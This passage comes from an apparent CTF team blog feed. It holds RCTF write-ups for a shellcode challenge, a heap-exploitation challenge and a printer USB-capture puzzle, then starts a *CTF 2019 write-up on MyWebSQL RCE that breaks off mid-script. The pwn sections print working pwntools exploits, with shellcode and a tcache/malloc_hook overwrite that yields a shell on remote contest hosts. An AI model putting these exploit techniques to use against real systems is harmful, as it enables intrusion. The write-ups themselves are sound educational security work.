class="line">xor rdi,rdi</span><br><span class="line"></span><br><span class="line">inc eax</span><br><span class="line">inc edi</span><br><span class="line">mov rsi, rsp</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor rax, rax</span><br><span class="line">mov al, 60</span><br><span class="line">syscall</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line">def show(s):</span><br><span class="line">x = 0</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">x = x*16*16+ord(s[len(s)-1-i])</span><br><span class="line">return x</span><br><span class="line">def cd(s):</span><br><span class="line">st = &quot;mov rax, &quot;+hex(show(s))</span><br><span class="line">return asm(st)+asm(&quot;&quot;&quot;</span><br><span class="line">push rax</span><br><span class="line">xor rax,rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov al, 80</span><br><span class="line">syscall</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">dic = &apos;qwertyuiopasdfghjklzxcvbnm0987654321&apos;</span><br><span class="line">def Get(s):</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">if (s[i] not in dic): return False</span><br><span class="line">return True</span><br><span class="line"></span><br><span class="line">def find(lt):</span><br><span class="line">#p=process(&apos;./shellcoder&apos;)</span><br><span class="line">p = remote(&apos;139.180.215.222&apos;,20002)</span><br><span class="line">p.readuntil(&apos;hello shellcoder:&apos;)</span><br><span class="line"></span><br><span class="line">payload = asm(&quot;&quot;&quot;</span><br><span class="line">xchg rdi,rsi</span><br><span class="line">mov edx,esi</span><br><span class="line">syscall</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = &apos;\x90&apos;*8 + cd(&apos;/flag&apos;)</span><br><span class="line">for i in range(len(lt)):</span><br><span class="line">payload += cd(lt[i])</span><br><span class="line"></span><br><span class="line">payload += ls()</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">tot = p.recv()</span><br><span class="line">ans = []</span><br><span class="line">for i in range(len(tot)-5):</span><br><span class="line">s = tot[i:i+4]</span><br><span class="line">if (not Get(s)): continue</span><br><span class="line">if (s[0] == &apos;.&apos; and s[1] == &apos;.&apos;): continue</span><br><span class="line">if (s == &apos;flag&apos;):</span><br><span class="line">print(&apos;***************\n&apos;)</span><br><span class="line">print(lt)</span><br><span class="line">print(&apos;***************\n&apos;)</span><br><span class="line">pause()</span><br><span class="line">if (s[0] == &apos;.&apos;): break</span><br><span class="line">ans.append(s)</span><br><span class="line">p.close()</span><br><span class="line">return ans</span><br><span class="line"></span><br><span class="line">def dg(lt): #递归</span><br><span class="line">tmp = find(lt)</span><br><span class="line">print lt</span><br><span class="line">if (len(tmp) == 0): return</span><br><span class="line">for i in range(len(tmp)):</span><br><span class="line">lt.append(tmp[i])</span><br><span class="line">dg(lt)</span><br><span class="line">lt.pop()</span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line">dg(ans)</span><br></pre></td></tr></table></figure><p>先cd然后cat flag即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">def cat():</span><br><span class="line">return asm(&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">mov rax,0x67616c66</span><br><span class="line">push rax</span><br><span class="line">xor rax, rax</span><br><span class="line">mov al, 2      </span><br><span class="line">mov rdi, rsp   </span><br><span class="line">xor rsi, rsi </span><br><span class="line">xor rdx, rdx </span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xchg rax, r12</span><br><span class="line"></span><br><span class="line">    .LOOP:</span><br><span class="line">    mov rdi, r12</span><br><span class="line">    xor rax, rax</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    inc edx</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    test rax, rax</span><br><span class="line">    jz .END</span><br><span class="line"></span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    inc rdi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp short .LOOP</span><br><span class="line">    .END:</span><br><span class="line"></span><br><span class="line">    xor rax,rax</span><br><span class="line">    mov al, 60</span><br><span class="line">    syscall</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rctf&#123;1h48iegin3egh8dc5ihu&#125;</span><br></pre></td></tr></table></figure><h3><span id="many_notes">many_notes</span></h3><p>可以利用printf leak地址 申请堆块去控制tache然后利用tache指针完成malloc_hook写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def dup(size,times,data=0):</span><br><span class="line">    io.sendlineafter(&quot;Choice:&quot;,&apos;0&apos;)</span><br><span class="line">    io.sendlineafter(&quot;Size:&quot;,str(size))</span><br><span class="line">    io.sendlineafter(&quot;Padding:&quot;,str(times))</span><br><span class="line">    if data==0:</span><br><span class="line">        io.sendlineafter(&quot;Input? (0/1):&quot;,&apos;0&apos;)</span><br><span class="line">    else:</span><br><span class="line">        io.sendlineafter(&quot;Input? (0/1):&quot;,&apos;1&apos;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">#io=process(&quot;./many_notes&quot;,env=&#123;&quot;LD_LIBRARY_PATH&quot;:&quot;./&quot;&#125;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io = remote(&quot;123.206.174.203&quot;,20003)</span><br><span class="line">io.sendafter(&quot;name&quot;,&apos;a&apos;*8)</span><br><span class="line">io.recvuntil(&apos;a&apos;*8)</span><br><span class="line">libc=u64(io.recvline()[:-1].ljust(8,&apos;\0&apos;))-0x3ab720</span><br><span class="line">print hex(libc)</span><br><span class="line">for i in range(0x17):</span><br><span class="line">    print i</span><br><span class="line">    dup(8192,1023)</span><br><span class="line">dup(8192,0x3f0-0x23)</span><br><span class="line">dup(0x1000,0,data=1)</span><br><span class="line">sleep(0.1)</span><br><span class="line">io.send(&apos;a&apos;*0xf00)</span><br><span class="line">sleep(0.1)</span><br><span class="line">io.send(&apos;a&apos;*0x100+p64(0x1eeee1)*2)</span><br><span class="line">dup(0x2000-0xee0-0x50+0x930,0)</span><br><span class="line">dup(0x500,0)</span><br><span class="line">dup(0x70,0)</span><br><span class="line">dup(0x70,0,data=1)</span><br><span class="line">sleep(0.1)</span><br><span class="line">#io.send((p64(0x3fff000)*2+p64(0x300000000)+p64(0)*10+p64(libc+0x3aabed-1)).ljust(0x70,&apos;\0&apos;))</span><br><span class="line">io.send((p64(libc+0x3AAC08)*8).ljust(0x70,&apos;\0&apos;))</span><br><span class="line">dup(176,0,data=1)</span><br><span class="line">sleep(0.1)</span><br><span class="line">one=libc+0x40eda</span><br><span class="line">io.send((p64(one)+p64(libc+0x80C49)).ljust(176,&apos;\0&apos;))</span><br><span class="line">print hex(one)</span><br><span class="line">print &quot;just add any new heap to get shell&quot;</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">RCTF&#123;House_of_0range_in_Thread&#125;</span><br></pre></td></tr></table></figure><h2><span id="misc">Misc</span></h2><h3><span id="printer">Printer</span></h3><p>提取流量数据包</p><p>https://drive.google.com/open?id=19rfKbGNgGSSwEodW43kLsRv8mAnMpEEM</p><p><strong>打印机厂商 NXP Semiconductors POS打印机<img src="https://lh4.googleusercontent.com/mOvxnGF204MDMRgjQEIyRg_mMG7GudxLN-fAlrQCmbvyKidwMklDLMkVytM4v2p42--lhoo4hevCo1QCf0gMX33HGmLu6YFxtZfNN3AHcqTV2PQYvYSx-zgYKtpwKacUz2D3-K29" alt="img"></strong></p><p><strong>打印python包</strong><a href="https://blog.csdn.net/fashionxu/article/details/9000761" target="_blank" rel="noopener">**https://blog.csdn.net/fashionxu/article/details/9000761**</a></p><p><strong>ECP/POS指令集</strong></p><p><a href="https://www.jianshu.com/p/dd6ca0054298" target="_blank" rel="noopener">**https://www.jianshu.com/p/dd6ca0054298**</a></p><p><strong>这个手册感觉好像能用：</strong></p><p><a href="https://www.servopack.de/support/tsc/TSPL_TSPL2_Programming.pdf" target="_blank" rel="noopener">**https://www.servopack.de/support/tsc/TSPL_TSPL2_Programming.pdf**</a></p><p><strong>这个repo好像可以打印：</strong></p><p><a href="https://github.com/timhawes/python-escpos" target="_blank" rel="noopener">**https://github.com/timhawes/python-escpos**</a></p><p><strong>关键数据：674 和675两行</strong></p><p><strong>Misc快出了，是个bitmap 数据包no.675</strong></p><p><strong>感觉重点在bar部分，像是打印了个二维码（划掉）</strong></p><p><strong><img src="https://lh3.googleusercontent.com/cMObZwslyfZGy6C2uD-XkBclgixyTzvgBYLHe_uO3i_VyCK_ejDuzivBSzer70DoiAQtAj4laF-D6s22YX2izgSjPcL4-WDcSH_6Q5nc8TOffNiSnaWJ0GXZKWDTZGYQf-kMxogg" alt="img"></strong></p><p><strong>BAR 348, 439, 2, 96</strong></p><p><strong>BAR 292, 535, 56, 2</strong></p><p><strong>BAR 300, 495, 48, 2</strong></p><p><strong>BAR 260, 447, 2, 88</strong></p><p><strong>BAR 204, 447, 56, 2</strong></p><p><strong>BAR 176, 447, 2, 96</strong></p><p><strong>BAR 116, 455, 2, 82</strong></p><p><strong>BAR 120, 479, 56, 2</strong></p><p><strong>BAR 44, 535, 48, 2</strong></p><p><strong>BAR 92, 455, 2, 80</strong></p><p><strong>BAR 20, 455, 72, 2</strong></p><p><strong>BAR 21, 455, 2, 40</strong></p><p><strong>BAR 21, 495, 24, 2</strong></p><p><strong>BAR 45, 479, 2, 16</strong></p><p><strong>BAR 36, 479, 16, 2</strong></p><p><strong>BAR 284, 391, 40, 2</strong></p><p><strong>BAR 324, 343, 2, 48</strong></p><p><strong>BAR 324, 287, 2, 32</strong></p><p><strong>BAR 276, 287, 48, 2</strong></p><p><strong>BAR 52, 311, 48, 2</strong></p><p><strong>BAR 284, 239, 48, 2</strong></p><p><strong>BAR 308, 183, 2, 56</strong></p><p><strong>BAR 148, 239, 48, 2</strong></p><p><strong>BAR 196, 191, 2, 48</strong></p><p><strong>BAR 148, 191, 48, 2</strong></p><p><strong>BAR 68, 191, 48, 2</strong></p><p><strong>BAR 76, 151, 40, 2</strong></p><p><strong>BAR 76, 119, 2, 32</strong></p><p><strong>BAR 76, 55, 2, 32</strong></p><p><strong>BAR 76, 55, 48, 2</strong></p><p><strong>BAR 112, 535, 64, 2</strong></p><p><strong>BAR 320, 343, 16, 2</strong></p><p><strong>BAR 320, 319, 16, 2</strong></p><p><strong>BAR 336, 319, 2, 24</strong></p><p><strong>BAR 56, 120, 24, 2</strong></p><p><strong>BAR 56, 87, 24, 2</strong></p><p><strong>BAR 56, 88, 2, 32</strong></p><p><strong>BAR 224, 247, 32, 2</strong></p><p><strong>BAR 256, 215, 2, 32</strong></p><p><strong>BAR 224, 215, 32, 2</strong></p><p><strong>BAR 224, 184, 2, 32</strong></p><p><strong>BAR 224, 191, 32, 2</strong></p><p><strong>BAR 272, 311, 2, 56</strong></p><p><strong>BAR 216, 367, 56, 2</strong></p><p><strong>BAR 216, 319, 2, 48</strong></p><p><strong>BAR 240, 318, 2, 49</strong></p><p><strong>BAR 184, 351, 2, 16</strong></p><p><strong>BAR 168, 351, 16, 2</strong></p><p><strong>BAR 168, 311, 2, 40</strong></p><p><strong>BAR 152, 351, 16, 2</strong></p><p><strong>BAR 152, 351, 2, 16</strong></p><p><strong>bar打印出来的flag：</strong></p><p><strong><img src="https://lh6.googleusercontent.com/x4iVHOqBQB-0opdzwcn0cmo_SnegEaPsQgTiuvMKjCyXMo3D8yJBn1jLeCMYWu7NLThFU-328d8xKUQJfGnQwvcA72wd4eceVDxs4zp8I8bKAJaAnYmD97uXnOOV-cmjr9-7XNFB" alt="img"></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line"></span><br><span class="line">Img = Image.open(<span class="string">"1.png"</span>) <span class="comment">#这是一个全白的图片**</span></span><br><span class="line"></span><br><span class="line">draw = ImageDraw.Draw(Img)</span><br><span class="line"></span><br><span class="line">points = [(<span class="number">348</span>, <span class="number">439</span>, <span class="number">2</span>, <span class="number">96</span>),(<span class="number">292</span>, <span class="number">535</span>, <span class="number">56</span>, <span class="number">2</span>),(<span class="number">300</span>, <span class="number">495</span>, <span class="number">48</span>, <span class="number">2</span>),(<span class="number">260</span>, <span class="number">447</span>, <span class="number">2</span>, <span class="number">88</span>),(<span class="number">204</span>, <span class="number">447</span>, <span class="number">56</span>, <span class="number">2</span>),(<span class="number">176</span>, <span class="number">447</span>, <span class="number">2</span>, <span class="number">96</span>),(<span class="number">116</span>, <span class="number">455</span>, <span class="number">2</span>, <span class="number">82</span>),(<span class="number">120</span>, <span class="number">479</span>, <span class="number">56</span>, <span class="number">2</span>),(<span class="number">44</span>, <span class="number">535</span>, <span class="number">48</span>, <span class="number">2</span>),(<span class="number">92</span>, <span class="number">455</span>, <span class="number">2</span>, <span class="number">80</span>),(<span class="number">20</span>, <span class="number">455</span>, <span class="number">72</span>, <span class="number">2</span>),(<span class="number">21</span>, <span class="number">455</span>, <span class="number">2</span>, <span class="number">40</span>),(<span class="number">21</span>, <span class="number">495</span>, <span class="number">24</span>, <span class="number">2</span>),(<span class="number">45</span>, <span class="number">479</span>, <span class="number">2</span>, <span class="number">16</span>),(<span class="number">36</span>, <span class="number">479</span>, <span class="number">16</span>, <span class="number">2</span>),(<span class="number">284</span>, <span class="number">391</span>, <span class="number">40</span>, <span class="number">2</span>),(<span class="number">324</span>, <span class="number">343</span>, <span class="number">2</span>, <span class="number">48</span>),(<span class="number">324</span>, <span class="number">287</span>, <span class="number">2</span>, <span class="number">32</span>),(<span class="number">276</span>, <span class="number">287</span>, <span class="number">48</span>, <span class="number">2</span>),(<span class="number">52</span>, <span class="number">311</span>, <span class="number">48</span>, <span class="number">2</span>),(<span class="number">284</span>, <span class="number">239</span>, <span class="number">48</span>, <span class="number">2</span>),(<span class="number">308</span>, <span class="number">183</span>, <span class="number">2</span>, <span class="number">56</span>),(<span class="number">148</span>, <span class="number">239</span>, <span class="number">48</span>, <span class="number">2</span>),(<span class="number">196</span>, <span class="number">191</span>, <span class="number">2</span>, <span class="number">48</span>),(<span class="number">148</span>, <span class="number">191</span>, <span class="number">48</span>, <span class="number">2</span>),(<span class="number">68</span>, <span class="number">191</span>, <span class="number">48</span>, <span class="number">2</span>),(<span class="number">76</span>, <span class="number">151</span>, <span class="number">40</span>, <span class="number">2</span>),(<span class="number">76</span>, <span class="number">119</span>, <span class="number">2</span>, <span class="number">32</span>),(<span class="number">76</span>, <span class="number">55</span>, <span class="number">2</span>, <span class="number">32</span>),(<span class="number">76</span>, <span class="number">55</span>, <span class="number">48</span>, <span class="number">2</span>),(<span class="number">112</span>, <span class="number">535</span>, <span class="number">64</span>, <span class="number">2</span>),(<span class="number">320</span>, <span class="number">343</span>, <span class="number">16</span>, <span class="number">2</span>),(<span class="number">320</span>, <span class="number">319</span>, <span class="number">16</span>, <span class="number">2</span>),(<span class="number">336</span>, <span class="number">319</span>, <span class="number">2</span>, <span class="number">24</span>),(<span class="number">56</span>, <span class="number">120</span>, <span class="number">24</span>, <span class="number">2</span>),(<span class="number">56</span>, <span class="number">87</span>, <span class="number">24</span>, <span class="number">2</span>),(<span class="number">56</span>, <span class="number">88</span>, <span class="number">2</span>, <span class="number">32</span>),(<span class="number">224</span>, <span class="number">247</span>, <span class="number">32</span>, <span class="number">2</span>),(<span class="number">256</span>, <span class="number">215</span>, <span class="number">2</span>, <span class="number">32</span>),(<span class="number">224</span>, <span class="number">215</span>, <span class="number">32</span>, <span class="number">2</span>),(<span class="number">224</span>, <span class="number">184</span>, <span class="number">2</span>, <span class="number">32</span>),(<span class="number">224</span>, <span class="number">191</span>, <span class="number">32</span>, <span class="number">2</span>),(<span class="number">272</span>, <span class="number">311</span>, <span class="number">2</span>, <span class="number">56</span>),(<span class="number">216</span>, <span class="number">367</span>, <span class="number">56</span>, <span class="number">2</span>),(<span class="number">216</span>, <span class="number">319</span>, <span class="number">2</span>, <span class="number">48</span>),(<span class="number">240</span>, <span class="number">318</span>, <span class="number">2</span>, <span class="number">49</span>),(<span class="number">184</span>, <span class="number">351</span>, <span class="number">2</span>, <span class="number">16</span>),(<span class="number">168</span>, <span class="number">351</span>, <span class="number">16</span>, <span class="number">2</span>),(<span class="number">168</span>, <span class="number">311</span>, <span class="number">2</span>, <span class="number">40</span>),(<span class="number">152</span>, <span class="number">351</span>, <span class="number">16</span>, <span class="number">2</span>),(<span class="number">152</span>, <span class="number">351</span>, <span class="number">2</span>, <span class="number">16</span>)]**</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pt <span class="keyword">in</span> points:</span><br><span class="line">x1,y1,a,b = pt</span><br><span class="line">    <span class="keyword">print</span> x1,y1,a,b</span><br><span class="line">    x2,y2 = x1+a,y1+b</span><br><span class="line">    draw.rectangle((x1,y1,x2,y2), fill=(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    Img.show()</span><br></pre></td></tr></table></figure><p>flag{my_tsc_}提交错误</p><p>说明还有一半flag</p><p>http://shaobaobaoer.cn/archives/690/usb-data-packet-analyze</p><p>利用这篇文章，提取出USB数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r Printer.pcapng -T fields -e usb.capdata &gt; usbdata.data</span><br></pre></td></tr></table></figure><figure><img src="https://upload-images.jianshu.io/upload_images/12580633-ec9a558201201b0d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><figcaption>image.png</figcaption></figure><p>发现这里有一些奇怪的数据</p><figure><img src="https://upload-images.jianshu.io/upload_images/12580633-ab6d18d2224a6c33.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><figcaption>image.png</figcaption></figure><p>而这里的数据26*48刚好等于2496*4，这里一个字母占4bit，于是想到可能是像素点，</p><figure><img src="https://upload-images.jianshu.io/upload_images/12580633-302dec72ecd5424d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><figcaption>image.png</figcaption></figure><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image,ImageDraw</span><br><span class="line">a=<span class="string">'ffffffffffffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffffffffffffffc3ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffe3fffe1ffffffffff807c03c603fc07c07e0007f7ff01f8067ff007ff803fc07c03fff1ff1f04f8ff1ff1fff1fff3ffcff1f27fc7f1ff3e1ff1ff9ffff1ff1fc1fcff8ff1fff1fff3ffefe3f87f8ff9feff8ff1ff9ffff8ff1fc3fc7fcff1fff1fff1ffefc7fc7f9ff8fdffc7f1ff9ffff8ff1fc7fe3fc7f1fff1fff1ffefcffe7f1ff8f9ffc3f1ff9ffffc7f1fc7fe3fe3f1fff1fff0ffef8ffe7f1ff0fbffe3f1ff9ffffc7f1fc7fe3fe3f1fff1fff0ffef8ffe7e1ff8f3ffe3f1ff9ffffe3f1fc7fe3ff1f1fff1fff47fef8ffe7e3ff9f7ffe1f1ff9ffffe3f1fc7ff3ff8e1fff1fff47fef9ffe7e3ffffffff1f1ff9fffff1f1fc7ff3ff8c1fff1fff63fef9ffe7f1ffffffff1f1ff9fffff1f1fc7ff3ffc11fff1fff63fef9ffe7f1ffffffff1f1ff9fffff1f1fc7fe3ffe31fff1fff71fef9ffe7f1ffffffff1f1ff9fffff8f1fc7fe3ffe71fff1fff71fef8ffe7f8ffffffff0f1ff9fffff8f1fc7fe3ffcf1fff1fff78fef8ffe7fcffffffff0f1ff9fffffc61fc7fe7ff9f1fff1fff78fef8ffc7fe3fffffff0f1ff9fffffc41fc7fc7ff3f1fff1fff7c7efcffc7ff83ffffff0f9ff1fffffe11fc3f8fff7f1fff1fff7c7efc7fa7ff87ffffff0f9fe9fffffe31fc1f1ffe7f1fff1fff7e3efe3e67fe3fffffff1f8f99ffffff31fc403fe01f1fff1fff7e3eff80e0fc7fffffff1fc039fffffe71fc79ffffff1fff1fff7f1efff3eff8ffffffff1ff0f9fffffef1fc7fffffff1fff1fff7f0efffffff8ffffffff1ffff9fffffcf1fc7fffffff1fff1fff7f8efffffff8fffffffe1ffff9fffff9f1fc7fffffff1fff1fff7f86fffffff8ff9f7ffe3ffff9fffffbf1fc7fffffff1fff1fff7fc6fffffff8ff0f3ffe3ffff9fffff7f1fc7fffffff1fff1fff7fc2fffffff8ff8fbffc7ffff9ffffe7f1fc7fffffff1fff1fff7fe2fffffff8ff8f9ffc7ffff9ffffcff1fc7fffffff1fff1fff7ff0fffffffcff9f9ff8fffff9ffff8ff1fc7fffffff1fff1fff7ff0fffffffc7f9f8ff1fffff9ffff0ff0fc3fffffff1fff0ffe7ff8fffffffe1e7f83e3fffff8fffc03c03c0fffffff03e000780ff83fffffff80fff80ffffff83ffffffffdffffffff3ffffffffffffffffffffffffffffffffbffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">im=Image.frombytes(<span class="string">"1"</span>,(<span class="number">26</span>*<span class="number">8</span>,<span class="number">48</span>),a)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><figure><img src="https://upload-images.jianshu.io/upload_images/12580633-0b2ed070c9c32436.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><figcaption>image.png</figcaption></figure><p>flag: flag{my_tsc_hc3pnikdk}</p><h3><span id="draw">draw</span></h3><p><strong>logo语言 在线运行</strong></p><p><a href="https://www.calormen.com/jslogo/" target="_blank" rel="noopener">**https://www.calormen.com/jslogo/**</a></p><figure><img src="https://upload-images.jianshu.io/upload_images/12580633-70f9d7f6ee5d7c46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><figcaption>image.png</figcaption></figure><h3><span id="welcome">Welcome</span></h3><figure><img src="https://upload-images.jianshu.io/upload_images/12580633-924d088efefbe2fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><figcaption>image.png</figcaption></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;de1ta-team&quot;&gt;&lt;strong&gt;De1ta-Team&lt;/strong&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="re" scheme="https://blog.de1ta.com/tags/re/"/>
    
      <category term="web" scheme="https://blog.de1ta.com/tags/web/"/>
    
      <category term="crypto" scheme="https://blog.de1ta.com/tags/crypto/"/>
    
      <category term="pwn" scheme="https://blog.de1ta.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://blog.de1ta.com/tags/misc/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
      <category term="rctf" scheme="https://blog.de1ta.com/tags/rctf/"/>
    
  </entry>
  
  <entry>
    <title>\*CTF 2019 Writeup</title>
    <link href="https://blog.de1ta.com/2019/04/30/*CTF%202019%20Writeup/"/>
    <id>https://blog.de1ta.com/2019/04/30/*CTF 2019 Writeup/</id>
    <published>2019-04-30T02:53:00.000Z</published>
    <updated>2020-05-07T04:39:22.839Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1><a id="more"></a><blockquote><p>Team：De1ta</p></blockquote><!-- toc --><ul><li><a href="#web">Web</a><ul><li><a href="#mywebsql">mywebsql</a></li></ul></li><li><a href="#misc">Misc</a><ul><li><a href="#she">she</a></li><li><a href="#babyflash">babyflash</a></li><li><a href="#otaku">otaku</a></li><li><a href="#blind-pwn">blind pwn</a></li><li><a href="#girlfriend">girlfriend</a></li><li><a href="#quicksort">quicksort</a></li><li><a href="#babyshell">babyshell</a></li><li><a href="#upxofnote">upxofnote</a></li></ul></li><li><a href="#re">RE</a><ul><li><a href="#fanogo">fanoGO</a></li><li><a href="#yy">yy</a></li><li><a href="#obfuscating-macros-ii">Obfuscating Macros II</a></li><li><a href="#matrix">matrix</a><ul><li><a href="#程序流程">程序流程</a></li><li><a href="#算法">算法</a></li><li><a href="#穷举求解">穷举求解</a></li><li><a href="#总结">总结</a></li></ul></li></ul></li><li><a href="#crypto">crypto</a><ul><li><a href="#babyprng">babyprng</a></li><li><a href="#babyprng2">babyprng2</a></li><li><a href="#notcurves">notcurves</a></li></ul></li></ul><!-- tocstop --><h2><span id="web">Web</span></h2><h3><span id="mywebsql">mywebsql</span></h3><p>admin admin登录<br>利用 MyWebSQL ver 3.7 RCE getshell<br><a href="https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md" target="_blank" rel="noopener">https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md</a></p><p>/目录下有个readflag，需要做先做一个计算才能getflag<br>服务端没python，但有perl</p><p>perl脚本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env perl </span><br><span class="line">use warnings;</span><br><span class="line">use strict;</span><br><span class="line">use IPC::Open2;</span><br><span class="line"></span><br><span class="line">$| = 1;</span><br><span class="line">chdir &quot;/&quot;; #!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line"></span><br><span class="line">my $pid = open2(\*out2, \*in2, &apos;/readflag&apos;) or die;</span><br><span class="line"></span><br><span class="line">my $reply = &lt;out2&gt;;</span><br><span class="line">print STDOUT $reply; #string: solve captcha..</span><br><span class="line">$reply = &lt;out2&gt;;</span><br><span class="line">print STDOUT $reply; #captcha formula</span><br><span class="line"></span><br><span class="line">my $answer = eval($reply);</span><br><span class="line">print STDOUT &quot;answer: $answer\n&quot;; </span><br><span class="line"></span><br><span class="line">print in2 &quot; $answer &quot;; #send it to process</span><br><span class="line">in2-&gt;flush();</span><br><span class="line"></span><br><span class="line">$reply = &lt;out2&gt;;</span><br><span class="line">print STDOUT $reply; #flag 